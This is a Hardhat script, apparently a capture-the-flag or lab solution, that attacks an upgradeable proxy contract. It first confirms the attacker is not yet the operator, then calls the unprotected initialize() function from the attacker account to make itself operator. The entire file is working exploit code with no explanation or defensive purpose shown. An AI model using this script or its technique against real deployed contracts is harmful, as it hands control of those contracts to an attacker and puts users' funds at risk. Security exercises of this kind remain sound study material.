import { ethers } from "hardhat"
import { getAttacker, upgradeProxyAddr } from "../utils"

async function main() {
    const attacker = getAttacker()

    const UpgradeProxy = await ethers.getContractAt("UpgradeProxyImplementation", upgradeProxyAddr)
    const operatorStored = await UpgradeProxy.callStatic.operator()

    if (operatorStored == attacker.address) {
        throw new Error(`Attacker is operator: ${operatorStored}`)
    }
    const tx = await UpgradeProxy.connect(attacker).initialize(
        attacker.address,
        {
            gasLimit: 100000,
        }
    )
    console.log(`initialize tx sent: ${tx.hash}`)
    await tx.wait()
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error)
        process.exit(1)
    })
